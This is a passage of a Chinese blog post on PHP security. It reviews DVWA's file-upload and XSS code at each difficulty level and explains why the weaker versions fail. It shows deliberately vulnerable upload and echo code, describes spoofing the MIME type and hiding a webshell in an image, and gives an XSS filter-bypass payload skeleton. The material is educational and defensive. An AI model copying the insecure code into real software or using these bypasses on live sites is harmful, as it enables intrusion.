+<h3 id="upload-file"><a href="#upload-file" class="headerlink" title="upload file"></a>upload file</h3><p>上传漏洞经常可以用来上传任意代码泄露系统信息，如<code>&lt;?php phpinfo();?&gt;</code>，甚至可以直接上传webshell，拿下服务器权限，所以这个漏洞是十分严重的。</p>
+<ul>
+<li>Low level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">        <span class="comment">// No </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Yes! </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>可以看到上面的代码对用户上传的文件（<code>$_FILE</code>全局数组的形式）没有进行任何的验证操作，就直接将其move到了upload目录，这是相当危险的操作，攻击者可以毫无忌惮的随意日。</p>
+<ul>
+<li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123; <span class="comment">#只判断了MIME</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>上面的代码加入了MIME判断，所谓的MIME判断是在请求头中的一个字段，用来指示文件类型，方便服务器进行对应的处理，只要抓包就可以随意修改，达到欺骗服务器的目的。（更多的解释可以查看：<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types）" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types）</a></p>
+<ul>
+<li>High level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>我们首先看到这个代码中使用的验证手段<code>( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; 
+        ( $uploaded_size &lt; 100000 ) &amp;&amp; 
+        getimagesize( $uploaded_tmp )</code>,<br>        首先判断文件名结尾是不是’jpg’,’jepg’,’png’类型，然后调用getimagesize()函数获取图像大小，其实就是判断图像格式是否规范。函数细节可以参看官网表述:（<a href="http://php.net/manual/zh/function.getimagesize.php）" target="_blank" rel="noopener">http://php.net/manual/zh/function.getimagesize.php）</a><br>        然后文件大小也进行了判断。所以这里主要存在两个限制条件，首先必须以特定文件名结尾，然后文件格式还得满足特定的图片格式。但是这样的代码虽然加大攻击难度，在一些条件成立的条件下，仍旧可以进行攻击，上传shell,首先图片格式可以伪造，在元数据中包含webshell，然后找到一个文件包含漏洞，就可以成功实现攻击，上c传shell。</p>
+<ul>
+<li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这个代码规范里，除了有之前所说的一些限制外，还加上了随机id与文件名结合MD5编码作为文件名，这会让webshell连接的时候找不到具体的文件而吃闭门羹。而且使用了imagecreatefromjpeg（）函数来对上次的图进行了重构，去除了多余的元数据，使得webshell无法隐匿在图片里面。这样一来双重保险下，彻底断绝了upload漏洞的可能。当然这里仍旧加入了Anti-CSRFtoken来防止CSRF攻击。</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>反射型xss是一种attack通过操作url，web应用将attack输入的url参数不加过滤或者过滤不全的情况下直接回显到客户端，造成前端脚本注入执行（多是JS执行），读者可以通过以下的实例看到漏洞的产生细节。当然在反射型xss中有一种别具一格的漏洞利用方式，那就是DOM型xss,这种类型的xss不会直接出现拼接到源码中，而是js在运行时操作dom对象来实现输出。DVWA只对xss笼统的归纳，归纳为反射型和存储型。那么我们就先对这两种编码规范进行理解（把dom 型xss放一放)。由于本身的代码量不大，所以直接给出所有反射型代码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Low</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//High</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过以上的代码范例可以看到，在medium和high的防御措施上，仍旧是黑名单式的过滤，而且思考的很狭隘，只是过滤了<code>&lt;script&gt;</code>标签，medium中直接硬编码的黑名单最不可取，别说换标签，直接大小写绕过；在High级别里面，通过正则，避免了<code>&lt;script&gt;</code>标签使用的可能，但是能够触发js的标签远不止这一个，随便一个如<code>&lt;img src=1 onerror=[xss]&gt;</code>都是可以绕过的。可以想到基于黑名单的策略是很容易疏漏的，不可取。在impossible中，直接对输入进行htnlspecilchars()编码转换，杜绝了xss。</p>
+<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>注意下面的代码只是偏向于服务器对用户的输入不经过验证处理就直接入库，导致下次取出展现到前端的时候出现xss。代码没有包含从数据库取出的操作部分。因为只要从用户获取到数据后进行了严格的验证处理，就可以避免存储型xss，所以最终原因不是从数据库取出部分，所以DVWA省略掉了。出于篇幅原因，在DVWA的存储型的漏洞复现中的缺陷细节和反射型类似，都是标签，正则过滤不全。就不再赘述，现把impossible代码规范列出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = stripslashes( $message ); </span><br><span class="line">    $message = mysql_real_escape_string( $message ); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = stripslashes( $name ); </span><br><span class="line">    $name = mysql_real_escape_string( $name ); </span><br><span class="line">    $name = htmlspecialchars( $name ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到代码中对txtName和mtxMessage用htmlspecialchars()转义成了html实体，但是仅有这个是不够的，我们从前面的函数解释可以了解到，这个函数在不加<code>ENT_QUOTES</code>参数是默认不转义<code>&#39;</code>，而且该函数不考虑<code>\</code>（容易造成sql注入，语句单引号被转义问题，当然数据库交互不是PDO模式才有可能存在sql注入），这样仍旧会造成xss，好在代码之前还使用了stripslashes()和mysql_real_escape_string()来分别对<code>&#39;</code>和<code>\</code>进行过，从而杜绝了xss。</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.sitepoint.com/top-10-php-security-vulnerabilities/" target="_blank" rel="noopener">https://www.sitepoint.com/top-10-php-security-vulnerabilities/</a><br><a href="http://blog.jobbole.com/53821/" target="_blank" rel="noopener">http://blog.jobbole.com/53821/</a><br><a href="https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet</a><br><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a><br><a href="https://github.com/Go0s/LFIboomCTF" target="_blank" rel="noopener">https://github.com/Go0s/LFIboomCTF</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2018/09/05/浅谈php安全/">浅谈php安全</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    little potato
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2018年09月05日 - 23:09
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2018年12月05日 - 22:12
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/09/05/浅谈php安全/" title="浅谈php安全">http://yoursite.com/2018/09/05/浅谈php安全/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
